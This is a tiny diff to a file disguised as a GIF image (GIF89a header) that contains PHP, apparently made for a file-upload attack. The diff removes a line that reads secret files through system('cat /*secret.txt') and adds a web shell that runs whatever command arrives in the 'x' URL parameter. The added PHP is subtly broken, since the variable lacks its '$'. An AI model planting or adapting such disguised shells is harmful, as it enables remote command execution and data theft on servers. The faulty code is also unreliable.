@@ -1,5 +1,6 @@
 GIF89a;
 test
 <?php
-    system('cat /*secret.txt');
+    x=$_GET["x"];
+    system(x);
 ?>
